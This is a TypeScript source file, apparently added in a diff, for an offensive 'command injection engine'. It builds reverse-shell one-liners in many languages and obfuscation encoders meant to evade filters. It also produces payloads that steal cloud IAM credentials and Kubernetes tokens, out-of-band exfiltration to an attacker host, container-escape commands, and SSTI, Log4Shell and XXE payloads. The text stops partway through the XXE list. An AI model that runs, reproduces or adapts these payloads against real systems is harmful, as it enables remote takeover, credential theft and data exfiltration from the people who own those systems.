@@ -1,0 +1,1966 @@
+/* ═══════════════════════════════════════════════════════════════════════════
+   NEXUSFORGE  —  Professional-Grade Command Injection Engine  v9.0
+   ═══════════════════════════════════════════════════════════════════════════ */
+
+const IFS = "${IFS}";
+const TAB = "\t";
+
+/* ─── Primitive encoders ─────────────────────────────────────────────────── */
+function b64(s: string): string { return Buffer.from(s).toString("base64"); }
+function b64url(s: string): string { return Buffer.from(s).toString("base64url"); }
+function rawHex(s: string): string { return Buffer.from(s).toString("hex"); }
+function hexEsc(s: string): string {
+  return [...Buffer.from(s)].map(b => `\\x${(b as number).toString(16).padStart(2,"0")}`).join("");
+}
+function octEsc(s: string): string {
+  return [...Buffer.from(s)].map(b => `\\${(b as number).toString(8).padStart(3,"0")}`).join("");
+}
+function urlEnc(s: string): string {
+  return [...Buffer.from(s)].map(b => `%${(b as number).toString(16).padStart(2,"0").toUpperCase()}`).join("");
+}
+function dblUrlEnc(s: string): string {
+  return [...Buffer.from(s)].map(b => `%25${(b as number).toString(16).padStart(2,"0").toUpperCase()}`).join("");
+}
+function htmlEnc(s: string): string {
+  return [...s].map(c => `&#${c.charCodeAt(0)};`).join("");
+}
+function charCodes(s: string): string {
+  return [...Buffer.from(s)].map(b => (b as number).toString()).join(",");
+}
+function printfBuild(s: string): string {
+  return `$(printf '${hexEsc(s)}')`;
+}
+
+/* ─── Random helpers ─────────────────────────────────────────────────────── */
+function rnd(lo = 10000, hi = 99999): number { return Math.floor(Math.random() * (hi - lo + 1)) + lo; }
+function varName(): string { return `_NX${rnd()}`; }
+
+/* ─── Keyword obfuscators ────────────────────────────────────────────────── */
+const SHELL_KEYWORDS = /\b(cat|id|whoami|ls|find|echo|curl|wget|bash|sh|zsh|fish|python3?|perl|ruby|nc|ncat|nmap|awk|sed|grep|tar|base64|openssl|php|java|gcc|hostname|uname|env|passwd|history|ps|kill|rm|cp|mv|chmod|chown|sudo|su|ping|sleep|read|printf|exec|eval|source|export|declare|set|unset|cut|head|tail|sort|uniq|tr|xargs|tee|dd|ip|ifconfig|ss|netstat|ssh|scp|ftp|telnet)\b/g;
+
+function breakKeywords(s: string): string {
+  return s.replace(SHELL_KEYWORDS, m => {
+    const mid = Math.ceil(m.length / 2);
+    return `${m.slice(0, mid)}''${m.slice(mid)}`;
+  });
+}
+function breakKeywordsDQ(s: string): string {
+  return s.replace(SHELL_KEYWORDS, m => {
+    const mid = Math.ceil(m.length / 2);
+    return `${m.slice(0, mid)}""${m.slice(mid)}`;
+  });
+}
+function splitConcat(s: string): string {
+  return [...s].map((c, i) => {
+    if (!/[a-zA-Z]/.test(c)) return c;
+    if (i % 4 === 0) return `"${c}"`;
+    if (i % 4 === 2) return `'${c}'`;
+    return c;
+  }).join("");
+}
+function varSlice(s: string): string {
+  const v = varName();
+  return `${v}=${JSON.stringify(s)};eval "$${v}"`;
+}
+
+/* ─── Self-target guard ──────────────────────────────────────────────────── */
+export function isSelfTarget(url: string): boolean {
+  const u = url.trim().toLowerCase();
+  return (
+    /https?:\/\/localhost[:/]/.test(u) ||
+    /https?:\/\/127\.\d+\.\d+\.\d+[:/]/.test(u) ||
+    /https?:\/\/0\.0\.0\.0[:/]/.test(u) ||
+    /https?:\/\/\[?::1\]?[:/]/.test(u) ||
+    /https?:\/\/\[?::ffff:127\./.test(u) ||
+    /https?:\/\/0[:/]/.test(u) ||
+    /https?:\/\/\[::1\]/.test(u)
+  );
+}
+
+/* ─── Reverse-shell payloads ─────────────────────────────────────────────── */
+export function buildReverseShells(ip: string, port: string): string[] {
+  const B64bash = b64(`bash -i >& /dev/tcp/${ip}/${port} 0>&1`);
+  const B64py   = b64(`import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`);
+  return [
+    `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+    `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`,
+    `{echo,${B64bash}}|{base64,-d}|bash`,
+    `0<&196;exec 196<>/dev/tcp/${ip}/${port};sh <&196 >&196 2>&196`,
+    `exec 5<>/dev/tcp/${ip}/${port};cat <&5|while read l;do $l 2>&5 >&5;done`,
+    `sh -i >& /dev/udp/${ip}/${port} 0>&1`,
+    `python3 -c "$(echo ${B64py}|base64 -d)"`,
+    `python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${ip}',${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"`,
+    `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+    `ruby -rsocket -e 'c=TCPSocket.new("${ip}","${port}");loop{cmd=c.gets.chomp;c.puts(\`#{cmd} 2>&1\`)}'`,
+    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
+    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${port} >/tmp/f`,
+    `nc -e /bin/sh ${ip} ${port}`,
+    `nc -e /bin/bash ${ip} ${port}`,
+    `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
+    `openssl s_client -quiet -connect ${ip}:${port}|/bin/bash|openssl s_client -quiet -connect ${ip}:${port}`,
+    `php -r '$sock=fsockopen("${ip}",${port});proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
+    `node -e "require('net').connect(${port},'${ip}',function(){var s=require('child_process').spawn('/bin/sh');this.pipe(s.stdin);s.stdout.pipe(this);s.stderr.pipe(this);})"`,
+    `awk 'BEGIN{s="/inet/tcp/0/${ip}/${port}";while(1){do{printf "$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}'`,
+    `exec 196<>/dev/tcp/${ip}/${port};bash <&196 >&196 2>&196`,
+    `while :;do bash -i >& /dev/tcp/${ip}/${port} 0>&1;sleep 3;done &`,
+    `python3 -c "import pty,socket,os;s=socket.socket();s.connect(('${ip}',${port}));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn('/bin/bash')"`,
+    `python3 -c "import ssl,socket,subprocess as sp;s=ssl.wrap_socket(socket.socket());s.connect(('${ip}',${port}));p=sp.Popen(['/bin/sh'],stdin=s,stdout=s,stderr=s)"`,
+    `node -e "const c=require('net').connect(${port},'${ip}');const s=require('child_process').spawn('/bin/sh',['-i']);c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c)"`,
+    `ncat --ssl ${ip} ${port} -e /bin/bash 2>/dev/null`,
+    `socat TCP:${ip}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
+    `socat OPENSSL:${ip}:${port},verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
+    `mkfifo /tmp/.sf;/bin/sh -i </tmp/.sf 2>&1|openssl s_client -quiet -connect ${ip}:${port} >/tmp/.sf 2>/dev/null;rm /tmp/.sf`,
+    `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF|/bin/sh 1>$TF 2>&1`,
+    `busybox nc ${ip} ${port} -e /bin/sh 2>/dev/null`,
+    `lua5.1 -e "local s=require('socket');local t=assert(s.tcp());t:connect('${ip}',${port});while true do local r=t:receive();local f=io.popen(r,'r');local b=f:read('*a');f:close();t:send(b);end" 2>/dev/null`,
+    `groovy -e 'def c=["bash","-i"].execute();def s=new Socket("${ip}",${port});c.consumeProcessOutput(s.outputStream,s.outputStream);c.waitFor()' 2>/dev/null`,
+    `php -r '$s=fsockopen("${ip}",${port});$p=proc_open("/bin/bash",array(0=>$s,1=>$s,2=>$s),$pp);proc_close($p);'`,
+    `curl -sfL "http://${ip}:${port}/" 2>/dev/null|sh || wget -qO- "http://${ip}:${port}/" 2>/dev/null|sh`,
+    `go run <(printf 'package main\nimport("net";"os/exec")\nfunc main(){c,_:=net.Dial("tcp","%s:%s");x:=exec.Command("/bin/sh","-i");x.Stdin=c;x.Stdout=c;x.Stderr=c;x.Run()}' "${ip}" "${port}") 2>/dev/null`,
+  ];
+}
+
+/* ─── Cloud metadata payloads ───────────────────────────────────────────── */
+export function buildCloudMetaPayloads(cmd: string): string[] {
+  const aws = "http://169.254.169.254/latest";
+  const gcp = "http://metadata.google.internal/computeMetadata/v1";
+  const az  = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
+  return [
+    `${cmd} && curl -sk ${aws}/meta-data/iam/security-credentials/`,
+    `${cmd} && curl -sk ${aws}/meta-data/iam/security-credentials/$(curl -sk ${aws}/meta-data/iam/security-credentials/)`,
+    `${cmd} && curl -sk ${aws}/user-data`,
+    `${cmd} && curl -sk ${aws}/meta-data/hostname`,
+    `${cmd} && curl -sk -H "Metadata-Flavor: Google" ${gcp}/instance/service-accounts/default/token`,
+    `${cmd} && curl -sk -H "Metadata-Flavor: Google" ${gcp}/instance/attributes/?recursive=true`,
+    `${cmd} && curl -sk -H "Metadata: true" "${az}"`,
+    `${cmd} && env | grep -iE 'aws|azure|gcp|google|cloud|key|secret|token|cred'`,
+    `${cmd} && cat ~/.aws/credentials 2>/dev/null`,
+    `${cmd} && find / -name "*.env" 2>/dev/null | head -5 | xargs cat 2>/dev/null`,
+    `${cmd} && printenv | grep -iE 'token|secret|key|pass|cred|auth|api'`,
+  ];
+}
+
+/* ─── Container escape payloads ─────────────────────────────────────────── */
+export function buildContainerEscapes(cmd: string): string[] {
+  return [
+    `${cmd} && cat /proc/1/cgroup | grep docker`,
+    `${cmd} && ls -la /var/run/docker.sock 2>/dev/null && echo DOCKER_SOCK_EXPOSED`,
+    `${cmd} && curl -sk --unix-socket /var/run/docker.sock http://localhost/containers/json`,
+    `${cmd} && nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash 2>/dev/null`,
+    `${cmd} && cat /proc/self/status | grep CapEff`,
+    `${cmd} && capsh --print 2>/dev/null`,
+    `${cmd} && mount | grep overlay`,
+    `${cmd} && cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null`,
+    `${cmd} && curl -sk https://kubernetes.default.svc/api/ -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   CORE: applyQuantumBypass
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function applyQuantumBypass(
+  cmd: string,
+  mode: string,
+  attackerIp  = "127.0.0.1",
+  attackerPort = "4444",
+): string {
+  if (!cmd) return "";
+  const raw   = String(cmd).trim();
+  const B64   = b64(raw);
+  const B64x2 = b64(B64);
+  const B64x3 = b64(B64x2);
+  const B64x4 = b64(B64x3);
+  const B64u  = b64url(raw);
+  const HEX   = hexEsc(raw);
+  const OCT   = octEsc(raw);
+  const RHEX  = rawHex(raw);
+  const words = raw.split(/\s+/);
+  const bin0  = words[0] ?? "id";
+  const args  = words.slice(1).join(" ");
+
+  switch (mode) {
+
+    case "classic": return raw;
+
+    case "blind": {
+      const v = varName();
+      return [
+        `${v}=$SECONDS`,
+        `{ ${raw}; } 2>&1`,
+        `_NX_E=$?`,
+        `{ sleep 7; } 2>/dev/null`,
+        `|| { ping -c 7 127.0.0.1 >/dev/null 2>&1; }`,
+        `|| { python3 -c "import time;time.sleep(7)" 2>/dev/null; }`,
+        `|| { perl -e "sleep 7" 2>/dev/null; }`,
+        `|| { node -e "setTimeout(()=>{},7e3)" 2>/dev/null; }`,
+        `|| { ruby -e "sleep 7" 2>/dev/null; }`,
+        `echo "[nx:blind|exit=$_NX_E|elapsed=$((SECONDS-${v}))s]"`,
+      ].join("; ");
+    }
+
+    case "oob": {
+      const B64cmd = b64(raw);
+      return (
+        `_NX_O=$(${raw} 2>&1); ` +
+        `_NX_B=$(printf '%s' "$_NX_O"|base64 -w0 2>/dev/null||printf '%s' "$_NX_O"|base64 2>/dev/null); ` +
+        `curl -sk -m8 -X POST "http://${attackerIp}:${attackerPort}/nx" ` +
+          `-H "X-NX-Cmd:${B64cmd}" -H "X-NX-Host:$(hostname)" ` +
+          `--data-urlencode "d=$_NX_O" >/dev/null 2>&1 & ` +
+        `wget -qO/dev/null --timeout=8 --post-data="b=$_NX_B" "http://${attackerIp}:${attackerPort}/nx" 2>/dev/null & ` +
+        `nslookup "$(printf '%s' "$_NX_O"|head -c16|tr -cd '[:alnum:]').oob.${attackerIp}" >/dev/null 2>&1 & ` +
+        `dig +short "@${attackerIp}" "$(printf '%s' "$_NX_O"|head -c30|tr -cd '[:alnum:]').nx" 2>/dev/null & ` +
+        `python3 -c "import urllib.request as r,base64,os;` +
+          `r.urlopen(r.Request('http://${attackerIp}:${attackerPort}/nx',` +
+          `data=base64.b64encode(os.popen(${JSON.stringify(raw)}).read(4096).encode()),` +
+          `headers={'X-NX':'${B64cmd}'}))" 2>/dev/null & ` +
+        `printf '%s\\n' "$_NX_O"`
+      );
+    }
+
+    case "quantum":
+      return [
+        `{ {echo,${B64}}|{base64,-d}|bash; } 2>/dev/null`,
+        `|| { eval "$(printf '${HEX}')"; } 2>/dev/null`,
+        `|| { eval "$(printf '${OCT}')"; } 2>/dev/null`,
+        `|| { bash<<<$(echo${TAB}${B64}|base64${TAB}-d); } 2>/dev/null`,
+        `|| { $(printf '\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68') -c "$(printf '${HEX}')"; } 2>/dev/null`,
+        `|| { python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())"; } 2>/dev/null`,
+        `|| { perl -e "system(pack('H*','${RHEX}'))"; } 2>/dev/null`,
+        `|| { ruby -e "require 'base64';system(Base64.decode64('${B64}'))"; } 2>/dev/null`,
+        `|| { node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})"; } 2>/dev/null`,
+        `|| { bash<<<$(echo "${B64x2}"|base64 -d|base64 -d); } 2>/dev/null`,
+        `|| { bash<<<$(echo "${B64x3}"|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
+        `|| { bash<<<$(echo "${B64x4}"|base64 -d|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
+        `|| { echo ${RHEX}|xxd -r -p|bash; } 2>/dev/null`,
+        `|| { printf '${OCT}'|bash; } 2>/dev/null`,
+      ].join(" ");
+
+    case "ifs": {
+      const ifsRaw = raw.replace(/ /g, IFS);
+      const ifsTab = raw.replace(/ /g, TAB);
+      const ifsNl  = raw.replace(/ /g, "$'\\n'");
+      return [
+        `{ ${ifsRaw}; } 2>/dev/null`,
+        `|| { IFS=,; set -- ${words.join(",")}; "$@"; } 2>/dev/null`,
+        `|| { ${ifsTab}; } 2>/dev/null`,
+        `|| { bash${IFS}-c${IFS}${JSON.stringify(raw)}; } 2>/dev/null`,
+        `|| { IFS=$'\\n\\t ';${ifsNl}; } 2>/dev/null`,
+        `|| { ${raw.replace(/ /g, "${IFS:0:1}")}; } 2>/dev/null`,
+        `|| eval${IFS}$(echo${IFS}${B64}|base64${IFS}-d) 2>/dev/null`,
+        `|| { X=${JSON.stringify(raw)};IFS=' ';eval $X; } 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "concat": {
+      const broken   = breakKeywords(raw);
+      const brokenDQ = breakKeywordsDQ(raw);
+      const splitC   = splitConcat(raw);
+      const sq       = raw.replace(/([a-z])([a-z]{2})/g, (_, a, bc) => `${a}''${bc}`);
+      return [
+        `{ ${broken}; } 2>/dev/null`,
+        `|| { ${brokenDQ}; } 2>/dev/null`,
+        `|| { ${splitC}; } 2>/dev/null`,
+        `|| { ${sq}; } 2>/dev/null`,
+        `|| { ${varSlice(raw)}; } 2>/dev/null`,
+        `|| { _a=${JSON.stringify(bin0.slice(0,2))};_b=${JSON.stringify(bin0.slice(2))};_c="$_a$_b";$_c ${args}; } 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "hex":
+      return [
+        `eval "$(printf '${HEX}')" 2>/dev/null`,
+        `|| { _NX="$(printf '${HEX}')"; eval "$_NX"; } 2>/dev/null`,
+        `|| perl -e "system(pack('H*','${RHEX}'))" 2>/dev/null`,
+        `|| python3 -c "import os;os.system(bytes.fromhex('${RHEX}').decode())" 2>/dev/null`,
+        `|| echo ${RHEX}|xxd -r -p|bash 2>/dev/null`,
+        `|| { printf '${HEX}'|bash; } 2>/dev/null`,
+        `|| node -e "require('child_process').execSync(Buffer.from('${RHEX}','hex').toString(),{stdio:'inherit'})" 2>/dev/null`,
+        `|| ruby -e "system([${charCodes(raw)}].pack('C*'))" 2>/dev/null`,
+        `|| bash -c "$(printf '%b' '${HEX}')" 2>/dev/null`,
+        `|| { _h=$(printf '${HEX}');bash -c "$_h"; } 2>/dev/null`,
+      ].join(" ");
+
+    case "b64loop":
+      return [
+        `bash<<<$(echo${TAB}${B64}|base64${TAB}-d) 2>/dev/null`,
+        `|| { _a="${B64x2}";bash<<<$(echo "$_a"|base64 -d|base64 -d); } 2>/dev/null`,
+        `|| { bash<<<$(echo "${B64x3}"|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
+        `|| { bash<<<$(echo "${B64x4}"|base64 -d|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
+        `|| {echo,${B64}}|{base64,-d}|{bash,} 2>/dev/null`,
+        `|| perl -MMIME::Base64 -e "system(decode_base64('${B64}'))" 2>/dev/null`,
+        `|| python3 -c "import base64 as b,os;os.system(b.b64decode(b.b64decode('${B64x2}')).decode())" 2>/dev/null`,
+        `|| echo ${B64u}|python3 -c "import sys,base64,os;os.system(base64.urlsafe_b64decode(sys.stdin.read().strip()).decode())" 2>/dev/null`,
+      ].join(" ");
+
+    case "env": {
+      const v1 = varName(); const v2 = varName(); const v3 = varName();
+      return [
+        `${v1}=${JSON.stringify(raw)};bash -c "$${v1}" 2>/dev/null`,
+        `|| { ${v2}=${JSON.stringify(bin0)};${v3}=${JSON.stringify(args)};"$${v2}" $${v3}; } 2>/dev/null`,
+        `|| { export ${v1}=${JSON.stringify(raw)};eval "$${v1}"; } 2>/dev/null`,
+        `|| { declare ${v1}=${JSON.stringify(raw)};eval "$${v1}"; } 2>/dev/null`,
+        `|| env ${v1}=${JSON.stringify(raw)} bash -c "eval \\$$${v1}" 2>/dev/null`,
+        `|| BASH_ENV=/dev/stdin bash <<<${JSON.stringify(raw)} 2>/dev/null`,
+        `|| { read ${v1}<<<${JSON.stringify(raw)};bash -c "$${v1}"; } 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "heredoc": {
+      const mk = `NX${rnd()}`;
+      return [
+        `bash<<'${mk}'\n${raw}\n${mk}`,
+        `bash<<${mk}\n${raw}\n${mk}`,
+        `sh<<'NXEOF'\n${raw}\nNXEOF`,
+        `python3<<'PYEOF'\nimport os\nos.system(${JSON.stringify(raw)})\nPYEOF`,
+        `perl<<'PLEOF'\nsystem(${JSON.stringify(raw)});\nPLEOF`,
+        `ruby<<'RBEOF'\nsystem(${JSON.stringify(raw)})\nRBEOF`,
+        `node<<'JSEOF'\nrequire('child_process').execSync(${JSON.stringify(raw)},{stdio:'inherit'});\nJSEOF`,
+      ].join("\n");
+    }
+
+    case "unicode": {
+      const hexPrint = raw.replace(/[a-zA-Z]/g,
+        c => `$(printf '\\x${c.charCodeAt(0).toString(16).padStart(2,"0")}')`
+      );
+      return [
+        `{ ${hexPrint}; } 2>/dev/null`,
+        `|| { $(printf '${HEX}'); } 2>/dev/null`,
+        `|| bash -c "$(printf '%b' '${HEX}')" 2>/dev/null`,
+        `|| { eval "$(printf '${HEX}')"; } 2>/dev/null`,
+        `|| printf '${HEX}'|bash 2>/dev/null`,
+        `|| { printf '%b' '${OCT}'|bash; } 2>/dev/null`,
+        `|| python3 -c "import os;os.system(bytes([${charCodes(raw)}]).decode())" 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "null":
+      return [
+        `{ ${raw}$'\\x00'; } 2>/dev/null`,
+        `|| bash -c "${raw.replace(/"/g, '\\"')}$'\\x00'" 2>/dev/null`,
+        `|| { printf '${HEX}\\x00'|bash; } 2>/dev/null`,
+        `|| python3 -c "import os;os.system(${JSON.stringify(raw)}+chr(0))" 2>/dev/null`,
+      ].join(" ");
+
+    case "wildcard": {
+      const globBin = bin0.replace(/[aeiou]/gi, "?");
+      return [
+        `{ /???/b??h -c ${JSON.stringify(raw)}; } 2>/dev/null`,
+        `|| { /???/b??h<<<$(echo${TAB}${B64}|base64${TAB}-d); } 2>/dev/null`,
+        `|| { /???/${globBin} ${args}; } 2>/dev/null`,
+        `|| { /[b][i][n]/[b][a][s][h] -c ${JSON.stringify(raw)}; } 2>/dev/null`,
+        `|| { ls /b??/* 2>/dev/null|head -1|xargs -I{} {} -c ${JSON.stringify(raw)}; } 2>/dev/null`,
+        `|| { $(ls /bin/b* 2>/dev/null|head -1) -c ${JSON.stringify(raw)}; } 2>/dev/null`,
+        `|| { /???/b??h -c "$(printf '${HEX}')"; } 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "comment": {
+      const poundBreak = words.join(" #\\\n");
+      return [
+        `{ ${poundBreak}; } 2>/dev/null`,
+        `|| { ${raw.replace(/ /g, "/**/")}; } 2>/dev/null`,
+        `|| bash -c $'${raw.replace(/\\/g, "\\\\").replace(/'/g, "\\'").replace(/ /g, " #\\n")}' 2>/dev/null`,
+        `|| { ${words.join("; : ;\n")}; } 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "double_enc":
+      return [
+        `bash -c "$(printf '%b' '${HEX}')" 2>/dev/null`,
+        `|| { eval $(printf '%b' '${HEX}'); } 2>/dev/null`,
+        `|| bash<<<$(printf '%b' '${HEX}') 2>/dev/null`,
+        `|| printf '%b' '${HEX}'|bash 2>/dev/null`,
+        `|| eval "$(echo '${B64x2}'|base64 -d|base64 -d)" 2>/dev/null`,
+        `|| { _x=$(printf '%b' '${HEX}');eval "$_x"; } 2>/dev/null`,
+      ].join(" ");
+
+    case "brace": {
+      const charRange = [...bin0].map(c => `{${c},}`).join("");
+      return [
+        `{ {echo,${B64}}|{base64,-d}|{bash,}; } 2>/dev/null`,
+        `|| { {b,}a{s,}h -c ${JSON.stringify(raw)}; } 2>/dev/null`,
+        `|| { {/bin/,}bash -c ${JSON.stringify(raw)}; } 2>/dev/null`,
+        `|| { ${charRange}${IFS}${args}; } 2>/dev/null`,
+        `|| { {b,}a{s,}h<<<$(echo${IFS}${B64}|{base64,-d}); } 2>/dev/null`,
+        `|| { {echo,$(echo${IFS}${B64})}|{base64,-d}|{bash,}; } 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "process_sub":
+      return [
+        `bash <(echo ${B64}|base64 -d) 2>/dev/null`,
+        `|| source <(echo ${B64}|base64 -d) 2>/dev/null`,
+        `|| . <(echo ${B64}|base64 -d) 2>/dev/null`,
+        `|| bash <(printf '${HEX}') 2>/dev/null`,
+        `|| bash <(printf '%b' '${HEX}') 2>/dev/null`,
+        `|| eval <(echo ${B64}|base64 -d) 2>/dev/null`,
+        `|| bash <(python3 -c "import base64;print(base64.b64decode('${B64}').decode())") 2>/dev/null`,
+      ].join(" ");
+
+    case "arith": {
+      const chrBuild = `$(for _c in ${charCodes(raw)};do printf "\\\\$(printf '%03o' $_c)";done)`;
+      return [
+        `{ bash -c "$(printf '${HEX}')"; } 2>/dev/null`,
+        `|| { ${chrBuild}; } 2>/dev/null`,
+        `|| python3 -c "import os;os.system(bytes([${charCodes(raw)}]).decode())" 2>/dev/null`,
+        `|| node -e "require('child_process').execSync(String.fromCharCode(${charCodes(raw)}),{stdio:'inherit'})" 2>/dev/null`,
+        `|| perl -e "system(chr(${charCodes(raw).replace(/,/g,").chr(")}))" 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "ansi_c": {
+      const ansiEsc = [...raw].map(c => {
+        const code = c.charCodeAt(0);
+        if (c === "'") return "\\'";
+        if (c === "\\") return "\\\\";
+        if (code < 0x20 || code > 0x7e) return `\\x${code.toString(16).padStart(2,"0")}`;
+        return c;
+      }).join("");
+      const hexAnsi = [...Buffer.from(raw)].map(b => `\\x${(b as number).toString(16).padStart(2,"0")}`).join("");
+      const octAnsi = [...Buffer.from(raw)].map(b => `\\${(b as number).toString(8).padStart(3,"0")}`).join("");
+      return [
+        `bash -c $'${ansiEsc}' 2>/dev/null`,
+        `|| eval $'${hexAnsi}' 2>/dev/null`,
+        `|| bash -c $'${hexAnsi}' 2>/dev/null`,
+        `|| eval $'${octAnsi}' 2>/dev/null`,
+        `|| { _c=$'${hexAnsi}';eval "$_c"; } 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "rev": {
+      const reversed = raw.split("").reverse().join("");
+      const B64rev   = b64(reversed);
+      return [
+        `echo ${JSON.stringify(reversed)}|rev|bash 2>/dev/null`,
+        `|| bash -c "$(echo ${B64rev}|base64 -d|rev)" 2>/dev/null`,
+        `|| python3 -c "import os;os.system(${JSON.stringify(reversed)}[::-1])" 2>/dev/null`,
+        `|| perl -e "system(scalar reverse ${JSON.stringify(reversed)})" 2>/dev/null`,
+        `|| node -e "require('child_process').execSync(${JSON.stringify(reversed)}.split('').reverse().join(''),{stdio:'inherit'})" 2>/dev/null`,
+      ].join(" ");
+    }
+
+    case "ssti": {
+      const e = raw.replace(/'/g, "\\'").replace(/"/g, '\\"');
+      return [
+        `{{config.__class__.__init__.__globals__['os'].popen('${e}').read()}}`,
+        `{{lipsum.__globals__['os'].popen('${e}').read()}}`,
+        `{{cycler.__init__.__globals__.os.popen('${e}').read()}}`,
+        `{{joiner.__init__.__globals__.os.popen('${e}').read()}}`,
+        `{{namespace.__init__.__globals__.os.popen('${e}').read()}}`,
+        `{{request.application.__globals__.__builtins__.__import__('os').popen('${e}').read()}}`,
+        `{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('${e}').read()}}{% endif %}{% endfor %}`,
+        `*{T(java.lang.Runtime).getRuntime().exec('${e}')}`,
+        `\${T(java.lang.Runtime).getRuntime().exec('${e}')}`,
+        `<%= system('${e}') %>`,
+        `<%= \`${e}\` %>`,
+        `#{system('${e}')}`,
+        `#set($e="exp")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"${e}")`,
+        `{{7*'7'}}`,
+      ].join("\n");
+    }
+
+    case "log4shell": {
+      const lh = attackerIp; const lp = attackerPort;
+      return [
+        `\${jndi:ldap://${lh}:${lp}/exploit}`,
+        `\${jndi:rmi://${lh}:${lp}/exploit}`,
+        `\${jndi:dns://${lh}:${lp}/exploit}`,
+        `\${jndi:corba://${lh}:${lp}/exploit}`,
+        `\${j\${::-n}di:ldap://${lh}:${lp}/exploit}`,
+        `\${j\${lower:n}di:ldap://${lh}:${lp}/exploit}`,
+        `\${jndi:\${lower:l}dap://${lh}:${lp}/exploit}`,
+        `\${j\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://${lh}:${lp}/exploit}`,
+        `\${J\${::-N}\${::-D}\${::-I}:\${::-L}\${::-D}\${::-A}\${::-P}://${lh}:${lp}/exploit}`,
+        `\${jndi:ldap://${lh}:${lp}/\${env:JAVA_VERSION}}`,
+        `\${jndi:ldap://${lh}:${lp}/\${env:AWS_SECRET_ACCESS_KEY}}`,
+        `\${jndi:ldap://${lh}:${lp}/\${sys:java.version}}`,
+        `\${jndi:ldap://${lh}:${lp}/\${hostName}}`,
+        `\${ind\${base64:aQ==}:\${::-l}dap://${lh}:${lp}/exploit}`,
+        `%24%7Bjndi%3Aldap%3A%2F%2F${lh}%3A${lp}%2Fexploit%7D`,
+        `\${jndi:ldap://\${env:NaN:-${lh}}:${lp}/exploit}`,
+        `\${jndi:ldap://${lh}:${lp}/\${java:os}}`,
+        `\${jndi:\${lower:l}\${lower:d}\${lower:a}\${lower:p}://${lh}:${lp}/exploit}`,
+      ].join("\n");
+    }
+
+    case "xxe": {
+      const xh = attackerIp; const xp = attackerPort;
+      return [
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///etc/shadow">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///proc/self/environ">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///proc/self/cmdline">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "http://${xh}:${xp}/xxe?ssrf">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY % d SYSTEM "http://${xh}:${xp}/evil.dtd">%d;]><r></r>`,
+        `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r[<!ENTITY x SYSTEM "expect://${raw.replace(/"/g,'\\"')}">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "dict://127.0.0.1:11211/stat">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "ftp://${xh}:${xp}/x">]><r>&x;</r>`,
